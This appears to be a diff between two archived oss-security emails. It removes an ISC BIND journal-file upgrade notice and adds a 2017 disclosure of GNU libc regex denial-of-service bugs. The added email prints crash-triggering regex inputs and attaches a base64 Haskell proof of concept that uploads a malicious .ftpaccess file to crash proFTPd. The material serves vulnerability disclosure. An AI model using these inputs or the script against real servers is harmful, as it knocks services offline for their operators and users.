@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["11977" "Monday" "22" "February" "2021" "19:46:25" "+0000" "ISC Security Officer" "security-officer@isc.org" nil "256" "[oss-security] BIND Operational Notification: Zone journal (.jnl) file incompatibility,after upgrading to BIND 9.16.12 and 9.17 - REVISION" nil nil nil "2" nil nil (number mark "U       security-off Feb 22  256/11977 " thread-indent "\"[oss-security] BIND Operational Notification: Zone journal (.jnl) file incompatibility,after upgrading to BIND 9.16.12 and 9.17 - REVISION\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] BIND Operational Notification: Zone journal (.jnl) file incompatibility,after upgrading to BIND 9.16.12 and 9.17 - REVISION" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6736" "Thursday" "9" "February" "2017" "14:24:58" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdQ4SaFqZDxhE5_s6x2L68Gf66Hq0MWjfN4=0T9zb3rSxw@mail.gmail.com>" "135" "[oss-security] Multiple DoS parsing and executing extended regex expressions in GNU libc" nil nil nil "2" "2017020917:24:58" "[oss-security] Multiple DoS parsing and executing extended regex expressions in GNU libc" (number mark "U       gustavo.grie Feb  9  135/6736  " thread-indent "\"[oss-security] Multiple DoS parsing and executing extended regex expressions in GNU libc\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 12043 invoked by uid 550); 22 Feb 2021 20:44:05 -0000
+Received: (qmail 2011 invoked by uid 550); 9 Feb 2017 17:25:12 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,290 +12,170 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 22036 invoked from network); 22 Feb 2021 19:46:40 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=isc.org; s=ostpay;
-	t=1614023188; bh=MK8RxrRGF4d50OyOEGCyPEMyuy5ixePlfb/W5Ec3AHk=;
-	h=To:Cc:From:Subject:Date;
-	b=AAP1DnKc3g+wmjDnElqHxLTfmVoysivfc5pC4OctoOh+OFU3iWcrZexYIUCaGL8wB
-	 qvSu+tKF2avBaMpP+QmqhlX4Y6mngdmVXhaWTWTUh3++sPMvUZddAtQofkPioTvnHC
-	 ok7KKjQuzRvBtn8GBD9H7OSAhMj4lFNPg+3mlwDA=
-DKIM-Filter: OpenDKIM Filter v2.9.2 zmx1.isc.org 77143160094
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=isc.org;
-	s=05DFB016-56A2-11EB-AEC0-15368D323330; t=1614023187;
-	bh=dde/G1quWQh7co04tFsqWU632qyeBpVAX/bIxAX7z/E=;
-	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type:
-	 Content-Transfer-Encoding;
-	b=hhMHycZ8oHRHts0/LZRM/00+M1WqbYUoXbspKvP9qYAb5AQ4jNryWP7FyfW5j+h9B
-	 kPxbvWIKz+C8VZxtLRAmUVmaScC3Oe74l+BJdX2RIvOuHVS199ys0OHVGDvomZyIOZ
-	 m8QZNvudZ/odmNCtmBFbcgOLYFbqhwTe0I5sAIw4=
-To: oss-security@lists.openwall.com
-Cc: security-officer@isc.org
-From: ISC Security Officer <security-officer@isc.org>
-Organization: Internet Systems Consortium
-Message-ID: <9f61ccca-4561-a338-8779-f8b58eb39ebf@isc.org>
-Date: Mon, 22 Feb 2021 19:46:25 +0000
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0)
- Gecko/20100101 Thunderbird/78.7.1
+Received: (qmail 1973 invoked from network); 9 Feb 2017 17:25:10 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=+4f/FMokDNczO0NSJ1xWNfThkP5NJInmOv8uPxi24Ic=;
+        b=t6b/4fWIusPg8A3gA+BQGADb3Lq2vfzc3REnxJl7F/pDMoeVIUpp6i7WCZ0taR3DXj
+         nnu++tn4Ysdu/uRO/vDbay0uL+KGHL7qjzDuiAXye2ZuoFDUhogdHPaTqgRkwp0/L47h
+         CtCq8gKhLk4Hkj0jOJoUCEmFrcZiRoSk539AQEwRKi2fiDeyMquukgMfCIpX9gZPP9OF
+         lVSCtAJUsvTBaST28nT173wxQkva9KiktI2pMLbciP42RcDoh5Dl5QUIHqBe+8DZWzjm
+         pUckQWWYjNEEi0o2ebKMDjaqsIpibWnzXb89p7IbrC6AVxc7plUsOEZLELWFpS1l0/Ci
+         CF2Q==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=+4f/FMokDNczO0NSJ1xWNfThkP5NJInmOv8uPxi24Ic=;
+        b=l65PqZSvjQjT4OLwjmvLbrzFv+Rg5nZA2m/MF8tX+LJJd0DWTKErTfQAOOxm/arUUa
+         sBKj4oJlfUadVm4IMCDrA3X/5w2FAKDGPk0ZXN3OPTEbGOzXboDlrL5vymPnaT7Y80ie
+         RdTZKa+Mj1OKSWOeXnH3vrNDjVSaaM0genoUDMEIVbfZYYffhYcWKNiguJq3npgj78Vm
+         RES9AANSoaesWCC1D72D8y0Ov+fNj8GnoaVDWl9poRgZeMENbEIM1nI3RnqobcjNxTrM
+         C1pC9Pc742qvQjpn8h+tpaDz3DFZc3fq1BgGTzeQkIE2rDKqurIm1U2aiMBbSoMAFONt
+         LqcA==
+X-Gm-Message-State: AIkVDXJiJNsWnvOvrP4K68g+cSiRd1hVT8mKIrnpybMP4mh+bCQM63aWyY5oIjumaNYEnasKHiobHN2l91sZSQ==
+X-Received: by 10.36.23.74 with SMTP id 71mr22332879ith.37.1486661098856; Thu,
+ 09 Feb 2017 09:24:58 -0800 (PST)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Language: en-US
+From: Gustavo Grieco <gustavo.grieco@gmail.com>
+Date: Thu, 9 Feb 2017 14:24:58 -0300
+Message-ID: <CACn5sdQ4SaFqZDxhE5_s6x2L68Gf66Hq0MWjfN4=0T9zb3rSxw@mail.gmail.com>
+To: oss-security@lists.openwall.com, Agustin Mista <mista.agustin@gmail.com>
+Content-Type: multipart/mixed; boundary=001a1143e38ab40e2c05481c426f
+Subject: [oss-security] Multiple DoS parsing and executing extended regex expressions in GNU libc
+
+--001a1143e38ab40e2c05481c426f
+Content-Type: multipart/alternative; boundary=001a1143e38ab40e2805481c426d
+
+--001a1143e38ab40e2805481c426d
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: quoted-printable
-Subject: [oss-security] BIND Operational Notification: Zone journal (.jnl) file
- incompatibility,after upgrading to BIND 9.16.12 and 9.17 - REVISION
 
-To the packagers and redistributors of BIND --
+Hello,
 
-Following further research, we have revised the Operational Notification
-published at the end of last week as we now have an improved
-understanding of its likely impact on authoritative BIND servers.
-The situation is not quite as serious as originally announced for those
-whose server shutdown process ensures that any pending zone file writes
-to disk are completed, (that is, the zone files on disk after the name
-server has stopped are a full copy of the zones in memory when it was
-running).
+We found a few extended regex expressions in GNU libc that will crash or
+abort the execution of regcomp or regexec. For instance:
 
-Cleanly-shutdown servers, when started again following the upgrade,
-should have no need to perform a zone roll-forward from the old journal
-files.  On restart, named should load all of the zones and start serving
-them without error.
+\a?{1,32767}
 
-Although named will have started and correctly loaded its zone files,
-the older incremental transactions in the journal files that were
-written prior to the upgrade will still be unusable.  This means that
-any zone updates made prior to the upgrade will not be accessible to
-named for providing incremental updates (IXFRs).  If requested named
-will instead respond with AXFR.
+will immediately exhaust the stack calling calc_eclosure_iter in the
+compilation. A small variation of this regex is:
 
-Primary authoritative zone administrators may therefore see no problems
-other than an unexpected but short term increase in AXFRs in place of
-IXFRs.
+\a?{0,32767}
 
-New incremental updates, added after restarting and in the new format,
-will all be accessible for IXFR and zone recovery.  Over a period of
-time and with periodic journal file pruning (per named.conf option
-max-journal-size) all incremental updates using the old format will be
-removed from the journal files.
+will consume a very large amount of memory: it seems to eat 16GB in less
+than a minute. It is also possible to exhaust the stack memory trying to
+parse:
 
-Please see the revised Operational Notification below for more detail.
+(((((((( ... repeated 15000 times
 
-Kind regards
+this issue is caused because regcomp will call the parse_expression,
+parse_branch and parse_reg_exp functions over and over again.
+Finally, the following regex will trigger an abort or invalid free when
+regexec is called:
 
-Cathy Almond
-ISC Support
+/S^^|\0|()//S^^|\0|()//S^^|\1|()/
 
------
+I don't think these issues can be used to execute arbitrary code, but it
+seems quite easy to produce a DoS if a remote application is parsing
+untrusted regex expressions.
+In fact, we asked one of our students, Agust=C3=ADn Mista, to create a simp=
+le PoC
+to show how to crash a proFTP server if you can write a .ftpaccess file.
+You can find the script attached.
 
-Operational Notification: Zone journal (.jnl) file incompatibility
-after upgrading to BIND 9.16.12 and 9.17
+These issues were tested in GNU libc 2.19 (Ubuntu 14.04) and 2.24 (ArchLinu=
+x).
 
-Posting date:        19 February 2021; updated 22 February 2021
-Program impacted:    BIND
-Versions affected:   BIND 9.16.12, BIND 9.16.12-S1 (Supported Preview
-                     Edition) and versions 9.17.0 -> 9.17.10 of the 9.17
-                     development branch.
+I think it should affect the last version of GNU libc as well. Can someone
+confirm it?
 
-Description:
+I'm investigating how to submit these issues in the new CVE form...
 
-   All changes made to a zone using dynamic updates or inbound
-   incremental zone update (IXFR) are stored in the zone's journal file.
-   This journal (.jnl) file is automatically created and maintained by
-   named, and will be used when named is re-started after a shutdown or
-   crash to roll-forward (replay) any zone updates that were not yet in
-   the version of the zone on disk when named stopped. A zone's journal
-   file is also used to provide incremental updates (IXFRs) to other
-   servers. DNSSEC-signed zones using inline-signing will also have
-   journal files associated with the signed version of the zone.
 
-   In BIND 9.17.0, we introduced the max-ixfr-ratio option, which is a
-   percentage representing the ratio of IXFR size to the size of the
-   entire zone. This sets the size threshold (expressed as a percentage
-   of the size of the full zone) beyond which named chooses to use an
-   AXFR response rather than IXFR when answering zone transfer requests.
-   This feature has now been back-ported to BIND 9.16, making its debut
-   in the 9.16.12 releases.
+Regards,
+Gustavo.
 
-   Unfortunately, one feature of this change escaped our notice, both
-   when writing the release documentation for BIND 9.17.0, and then
-   later on, adding the max-ixfr-ratio option to BIND 9.16.12. A small
-   change was required to the journal (.jnl) file format in order to
-   support the calculation of an IXFR size during its preparation. The
-   old format .jnl file is incompatible with the versions of BIND that
-   support the new max-ixfr-ratio option.
+--001a1143e38ab40e2805481c426d
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
 
-   When BIND is upgraded to 9.16.12, 9.16.12-S1 or 9.17 (any version)
-   and then started with journal (.jnl) files present that were created
-   by earlier versions, there may be some problems encountered due to
-   the incompatibility.  Several scenarios exist, here are the two that
-   we believe are most likely to be encountered:
+<div dir=3D"ltr"><div><div><div><div><div>Hello,<br><br></div>We found a fe=
+w extended <span class=3D"" style=3D"" id=3D":2gr.1" tabindex=3D"-1">regex<=
+/span> expressions in GNU <span class=3D"" style=3D"" id=3D":2gr.2" tabinde=
+x=3D"-1">libc</span> that will crash or abort the execution of <span class=
+=3D"" style=3D"" id=3D":2gr.3" tabindex=3D"-1">regcomp</span> or <span clas=
+s=3D"" style=3D"" id=3D":2gr.4" tabindex=3D"-1">regexec</span>. For instanc=
+e:<br><br>\a?{1,32767}</div><div><br>will immediately exhaust the stack cal=
+ling <span class=3D"" style=3D"" id=3D":2gr.5" tabindex=3D"-1">calc</span>_=
+<span class=3D"" style=3D"" id=3D":2gr.6" tabindex=3D"-1">eclosure</span>_<=
+span class=3D"" style=3D"" id=3D":2gr.7" tabindex=3D"-1">iter</span> in the=
+ compilation. A small variation of this <span class=3D"" style=3D"" id=3D":=
+2gr.8" tabindex=3D"-1">regex</span> is:<br></div><br><div>\a?{0,32767}<br><=
+br></div>will consume a very large amount of memory: it seems to eat 16GB i=
+n less than a minute. It is also possible to exhaust the stack memory tryin=
+g to parse:<br></div><br></div><div>(((((((( ... repeated 15000 times<br></=
+div><div><br></div><div>this issue is caused because <span class=3D"" style=
+=3D"" id=3D":2gr.9" tabindex=3D"-1">regcomp</span> will call the parse_expr=
+ession,=C2=A0 parse_branch and parse_reg_exp functions over and over again.=
+<br></div>Finally, the following <span class=3D"" style=3D"" id=3D":2gr.10"=
+ tabindex=3D"-1">regex</span> will trigger an abort or invalid free when <s=
+pan class=3D"" style=3D"" id=3D":2gr.11" tabindex=3D"-1">regexec</span> is =
+called:<br><br>/S^^|\0|()//S^^|\0|()//S^^|\1|<wbr>()/<br><br></div><div>I d=
+on&#39;t think these issues can be used to execute arbitrary code, but it s=
+eems quite easy to produce a <span class=3D"" style=3D"" id=3D":2gr.12" tab=
+index=3D"-1">DoS</span> if a remote application is parsing untrusted <span =
+class=3D"" style=3D"" id=3D":2gr.13" tabindex=3D"-1">regex</span> expressio=
+ns.<br></div><div>In fact, we asked one of our students, <span class=3D"" s=
+tyle=3D"" id=3D":2gr.14" tabindex=3D"-1">Agust=C3=ADn</span> <span class=3D=
+"" style=3D"" id=3D":2gr.15" tabindex=3D"-1">Mista</span>, to create a simp=
+le <span class=3D"" style=3D"" id=3D":2gr.16" tabindex=3D"-1">PoC</span> to=
+ show how to crash a <span class=3D"" style=3D"" id=3D":2gr.17" tabindex=3D=
+"-1">proFTP</span> server if you can write a .<span class=3D"" style=3D"" i=
+d=3D":2gr.18" tabindex=3D"-1">ftpaccess</span> file. You can find the scrip=
+t attached.<br></div><div><div><br>These issues were tested in GNU <span cl=
+ass=3D"" style=3D"" id=3D":2gr.19" tabindex=3D"-1">libc</span> 2.19 (<span =
+class=3D"" style=3D"" id=3D":2gr.20" tabindex=3D"-1">Ubuntu</span> 14.04) a=
+nd 2.24 (<span class=3D"" style=3D"" id=3D":2gr.21" tabindex=3D"-1">ArchLin=
+ux</span>). <br>I think it should affect the last version of GNU <span clas=
+s=3D"" style=3D"" id=3D":2gr.22" tabindex=3D"-1">libc</span> as well. Can s=
+omeone confirm it?<br><br></div><div></div><div>I&#39;m investigating how t=
+o submit these issues in the new <span class=3D"" style=3D"" id=3D":2gr.23"=
+ tabindex=3D"-1">CVE</span> form...<br><br><br></div><div>Regards,<br></div=
+><div>Gustavo.<br></div><div><br><br></div></div></div>
 
-   - On an authoritative server (primary or secondary), where named was
-     shutdown abruptly ('rndc halt' or 'kill -TERM') without flushing
-     the in-memory versions of zones to disk first, some zones on disk
-     will not reload when named is started after upgrading because their
-     .jnl files are incompatible and the latest zone changes cannot be
-     applied to bring the zone up to date. See Workarounds below for
-     potential routes for recovery of any zones in this state.
+--001a1143e38ab40e2805481c426d--
 
-     Note:
-     --
-     The named.conf option 'flush-zones-on-shutdown' changes the
-     behaviour of named when receiving SIGTERM.  The default is:
-       flush-zones-on-shutdown no;
-     --
+--001a1143e38ab40e2c05481c426f
+Content-Type: text/x-haskell; charset=US-ASCII; name="PoC.hs"
+Content-Disposition: attachment; filename="PoC.hs"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_iyymws360
 
-   - On an authoritative server (primary or secondary), where named was
-     shutdown using 'rndc stop' and all recent changes written to the
-     zone files first, all zones will load when named is restarted
-     following the upgrade (the increment headers can be read during
-     the journal file walk-through, and there is no need for named
-     to examine the individual change records in the file).  However,
-     this server will not be able to respond to IXFR requests for
-     changes that were made to its zones prior to the upgrade and will
-     send AXFR instead. Eventually (depending on the value of
-     'max-journal-size' in 'named.conf'), during regular pruning, the
-     increments using the old format will be removed.
+IyEvdXNyL2Jpbi9lbnYgc3RhY2sgCi0tIHN0YWNrIHJ1bmdoYyAtLXJlc29s
+dmVyIGx0cy03LjAgLS1zeXN0ZW0tZ2hjIC0tcGFja2FnZSBmdHBocwotLQot
+LSBNdWx0aXBsZSBkZW5lZ2F0aW9uIG9mIHNlcnZpY2UgaW4gcmVnY29tcAot
+LSBnbGliYyA8PSAyLjI1Ci0tCi0tIFRoaXMgUG9DIGNhbiBkaXN0dXJiIHBy
+b0ZUUGQgd2hlbiBjb21waWxlZCB3aXRob3V0Ci0tIHBjcmUgc3VwcG9ydC4g
+SXQgcmVxdWlyZXMgYSB2YWxpZCB1c2VyIHdpdGgKLS0gdXBsb2FkIHBlcm1p
+c3Npb25zLgotLQotLSBieSBBLiBNaXN0YS4KLS0KLS0gRm9yIHRlc3Rpbmcg
+cHVycG9zZXMgb25seS4gRG8gbm8gaGFybS4KCmltcG9ydCBTeXN0ZW0uRW52
+aXJvbm1lbnQKaW1wb3J0IFN5c3RlbS5JTwppbXBvcnQgTmV0d29yay5GVFAu
+Q2xpZW50CmltcG9ydCBDb250cm9sLkV4Y2VwdGlvbgoKaGFuZGxlciA6OiBT
+b21lRXhjZXB0aW9uIC0+IElPICgpCmhhbmRsZXIgXyA9IHB1dFN0ckxuICJb
+K10gSXQncyBkZWFkLCBKaW0iCgptYWluID0gZG8KICAgIGFyZ3MgPC0gZ2V0
+QXJncwogICAgY2FzZSBhcmdzIG9mCiAgICAgICAgW2FkZHIsIHVzZXIsIHBh
+c3NdIC0+IGRvIAogICAgICAgICAgICBwdXRTdHJMbiAiWytdIENvbm5lY3Rp
+bmcgdG8gdGhlIGZ0cCBzZXJ2ZXIgYW5kIGxvZ2luIgogICAgICAgICAgICBj
+b25uIDwtIGVhc3lDb25uZWN0RlRQIGFkZHIKICAgICAgICAgICAgbG9naW4g
+Y29ubiB1c2VyIChKdXN0IHBhc3MpIE5vdGhpbmcKICAgICAgICAgICAgcHV0
+U3RyTG4gIlsrXSBTZW5kaW5nIHRoZSBtaWdodHkgcmVnZXgiCiAgICAgICAg
+ICAgIHB1dGJpbmFyeSBjb25uICIuZnRwYWNjZXNzIiAiSGlkZUZpbGVzIFwi
+XFxhP3sxLDMyNzY3fVwiXG4iCiAgICAgICAgICAgIHB1dFN0ckxuICJbK10g
+VHJpZ2dlcmluZyB0aGUgc2VydmVyIHRvIHBhcnNlIC5mdHBhY2Nlc3MiCiAg
+ICAgICAgICAgIGNhdGNoIChkaXIgY29ubiBOb3RoaW5nID4+IHB1dFN0ckxu
+ICJbLV0gTm90IGFmZmVjdGVkIikgaGFuZGxlcgogICAgICAgIF8gLT4gcHV0
+U3RyTG4gIlVTQUdFOiAuL1BvQy5ocyBbQUREUkVTU10gW1VTRVJdIFtQQVNT
+V09SRF0iCg==
 
-Impact:
-
-   This problem can affect BIND servers whose authoritative zones are
-   maintained via dynamic updates, or by editing the zone file and
-   reloading on a server with option 'ixfr-from-differences' enabled.
-   Secondary zones that are maintained using incremental updates (IXFR)
-   are similarly at risk. The 'ixfr-from-differences' option may also be
-   used in some environments to generate journal files following an
-   inbound AXFR.  Use of DNSSEC inline-signing zones adds a further
-   layer of complexity to the above scenarios, as both the signed and
-   the unsigned versions of the zone have their own journal files.
-
-Workarounds:
-
-   We do not have a tool available to convert the journal files to the
-   new format, therefore on upgrading, it is advisable (but depending
-   on your circumstances, not absolutely necessary) to start named
-   with the old format journal files removed.
-
-   (Options if you have not yet upgraded:)
-
-   1.  Before upgrading, ensure that named is stopped using rndc stop.
-   This will ensure that all zones are written to disk during the
-   shutdown processing. After named has stopped, delete or relocate all
-   the associated .jnl files so that they are not accessed when named is
-   restarted. named will generate new .jnl files as needed.
-
-   Warning: Do not stop named using rndc halt before upgrading
-   --
-     Using rndc halt instead of rndc stop will stop the server
-     immediately.  Recent changes made through dynamic update or
-     IXFR are not saved to the zone files on disk first (and will
-     need to be rolled-forward from the journal files when named is
-     restarted; this is what you need to prevent so that you can
-     delete them before upgrading).
-   --
-
-   2.  For a provisioning/primary authoritative server, you have another
-   option for ensuring that the zones are written to disk and that the
-   journal files are removed. First, ensure that all dynamic updates are
-   paused, then issue command:
-
-      rndc sync -clean
-
-   Then stop named as normal (you should not need to remove the .jnl
-   files manually as the 'rndc sync -clean' will have taken care of this
-   step).
-
-   (Options if you have already upgraded:)
-
-   3.  If named was stopped before you upgraded using 'rndc stop' and
-   you know that this completed successfully, then you may wish to do
-   nothing, and wait for the older increments to be removed from your
-   .jnl files via periodic pruning.  Alternatively, and for zones that
-   update very infrequently, you may prefer to remove or relocate the
-   .jnl files.
-
-   4.  If you are not sure if your zone files on disk were updated when
-   you stopped named and you have a large number of zones to recover,
-   then it may be easiest to back-out the update, start named to do the
-   roll-forward and load, and then shutdown again (rndc stop) before
-   following option 1. above.
-
-   5.  For zones that are secondary, you can use the rndc utility with
-   the retransfer command to obtain a fresh AXFR of the zone from
-   another server. This will result in its old journal files being
-   deleted and then recreated using the new format following the next
-   inbound IXFR.
-
-   6.  If you have only a small number of zones to recover, then you may
-   prefer to recover (or build) named-checkzone from your pre-upgrade
-   version of BIND and use that to regenerate the zone files from
-   the .jnl files.
-
-   For example, to create a new zone file 'example.com.new' for zone
-   'example.com' by rolling forward from 'example.com.jnl' and
-   'example.com', you would type:
-
-      named-checkzone -jD -o example.com.new example.com example.com
-
-   And then you would:
-
-   - remove files 'example.com.jnl' and 'example.com'
-   - rename 'example.com.new' to 'example.com'.
-
-   Note: Use -f and -F options if your zone files are not in text
-   format. BIND supports several formats of zone file - check which
-   format you need first.
-
-   Hint: Make backup copies of the zone and .jnl files before you run
-   named-checkzone.  The named-checkzone utility, when run with the
-   -jD  options, will apply the journal file changes to the zone and
-   then delete it afterwards. If you make a mistake with the options,
-   you may want to start again; having a backup copy in that situation
-   is essential!
-
-Solution:
-
-   Code changes to support roll-forward from the older format of .jnl
-   files are planned for the March 2021 maintenance releases (due
-   17 March 2021) but until then the measures suggested in the
-   "Workarounds" section should prevent or resolve post-upgrade zone
-   loading problems for Authoritative BIND server operators.
-
-Do you still have questions?
-Questions regarding this notification should go to security-
-officer@isc.org. To report a new issue, please encrypt your message
-using security-officer@isc.org's PGP key which can be found here:
-https://www.isc.org/pgpkey/. If you are unable to use encrypted email,
-you may also report new issues at: https://www.isc.org/reportbug/.
-
-Note:
-
-   ISC patches only currently supported versions. When possible we
-   indicate EOL versions affected. (For current information on which
-   versions are actively supported, please see:
-   https://www.isc.org/download/.)
-
-ISC Security Vulnerability Disclosure Policy:
-
-   Details of our current security advisory policy and practice can be
-   found in the ISC Software Defect and Security Vulnerability
-   Disclosure Policy at https://kb.isc.org/docs/aa-00861.
-
-This Knowledgebase article, found at
-https://kb.isc.org/v1/docs/operational-notification-zone-journal-jnl-file-i=
-ncompatibility-after-upgrading-to-bind-91612-and-917
-is the complete and official
-operational notification document.
-
-Legal Disclaimer:
-
-   Internet Systems Consortium (ISC) is providing this notice on an "AS
-   IS" basis. No warranty or guarantee of any kind is expressed in this
-   notice and none should be implied. ISC expressly excludes and
-   disclaims any warranties regarding this notice or materials referred
-   to in this notice, including, without limitation, any implied
-   warranty of merchantability, fitness for a particular purpose,
-   absence of hidden defects, or of non-infringement. Your use or
-   reliance on this notice or materials referred to in this notice is at
-   your own risk. ISC may change this notice at any time. A stand-alone
-   copy or paraphrase of the text of this document that omits the
-   document URL is an uncontrolled copy. Uncontrolled copies may lack
-   important information, be out of date, or contain factual errors.
+--001a1143e38ab40e2c05481c426f--
